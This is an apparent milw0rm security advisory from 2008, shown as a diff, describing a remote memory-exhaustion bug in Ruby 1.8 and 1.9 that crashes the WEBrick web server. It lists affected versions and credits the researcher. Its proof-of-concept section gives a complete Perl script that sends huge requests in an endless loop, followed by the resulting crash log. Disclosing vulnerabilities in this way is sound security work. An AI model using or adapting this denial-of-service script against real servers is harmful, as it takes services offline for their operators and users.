@@ -1,0 +1,88 @@
+-------------------------------------------------------
+Language : Ruby 
+
+Web Site: www.ruby-lang.org
+
+Platform: All
+
+Bug: Remote Socket Memory Leak
+
+Products Affected:
+1.8 series:
+- 1.8.5 and all prior versions
+- 1.8.6-p286 and all prior versions
+- 1.8.7-p71 and all prior versions
+
+1.9 series
+- r18423 and all prior revisions
+
+Confirmed by the vendor: Yes
+
+Patch available : Yes
+-------------------------------------------------------
+
+1) Introduction
+2) Bug
+3) Proof of concept
+4) Credits
+
+===============
+1) Introduction
+===============
+"A dynamic, open source programming language with a focus on simplicity and productivity.
+It has an elegant syntax that is natural to read and easy to write."
+
+=======
+2) Bug
+=======
+Ruby fails to handle properly the memory allocated for a socket
+So when you send ~ 4 big request to a ruby socket, ruby will go 
+in infinite loop, and then crash.
+The bug reside in the regex engine (in regex.c).
+
+==================
+3)Proof of concept
+===================
+This poc is an exemple for Webrick web server
+crap.pl :
+
+#!/usr/bin/perl
+use LWP::Simple;
+my $payload = "\x41" x 49999999;
+while(1)
+{
+print "[+]\n";
+get "http://127.0.0.1:2500/".$payload."";
+}
+
+Result (Exemple on Webrick web server):
+
+[2008-07-11 22:39:55] INFO  WEBrick 1.3.1
+[2008-07-11 22:39:55] INFO  ruby 1.8.6 (2007-09-24) [i486-linux]
+[2008-07-11 22:39:55] INFO  WEBrick::HTTPServer#start: pid=13850 port=2500
+[2008-07-11 22:40:51] ERROR NoMemoryError: failed to allocate memory
+        /usr/lib/ruby/1.8/webrick/httprequest.rb:228:in `read_request_line'
+        /usr/lib/ruby/1.8/webrick/httprequest.rb:86:in `parse'
+        /usr/lib/ruby/1.8/webrick/httpserver.rb:56:in `run'
+        /usr/lib/ruby/1.8/webrick/server.rb:173:in `start_thread'
+        /usr/lib/ruby/1.8/webrick/server.rb:162:in `start'
+        /usr/lib/ruby/1.8/webrick/server.rb:162:in `start_thread'
+        /usr/lib/ruby/1.8/webrick/server.rb:95:in `start'
+        /usr/lib/ruby/1.8/webrick/server.rb:92:in `each'
+        /usr/lib/ruby/1.8/webrick/server.rb:92:in `start'
+        /usr/lib/ruby/1.8/webrick/server.rb:23:in `start'
+        /usr/lib/ruby/1.8/webrick/server.rb:82:in `start'
+        /home/audit/instiki-0.13.0/vendor/rails/railties/lib/webrick_server.rb:63:in `dispatch'
+        script/server:62
+[FATAL] failed to allocate memory
+root@audit:/home/audit#
+
+=====
+5)Credits
+=====
+
+laurent gaffié
+
+laurent.gaffie{remove_this}[at]gmail[dot]com
+
+# milw0rm.com [2008-08-13]
